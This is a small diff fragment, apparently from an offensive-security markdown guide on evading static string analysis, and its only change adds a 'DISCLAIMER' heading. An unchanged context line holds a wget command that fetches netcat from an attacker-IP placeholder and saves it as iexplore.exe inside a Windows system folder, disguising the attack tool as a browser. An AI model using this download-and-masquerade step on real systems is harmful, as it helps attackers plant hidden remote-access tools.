@@ -141,4 +141,4 @@ ALSO HELPS TO BYPASS STATIC STRING ANANLYSIS AND MASQUERADING AS BENIGN APPLICAT
 wget http://<attackerip/netcat> -outfile C:\windows\system32\spool\drivers\color\iexplore.exe
 ```
 
-**<span font-size: 20px></span>**
+<span style=font-size: 20px>DISCLAIMER</span>
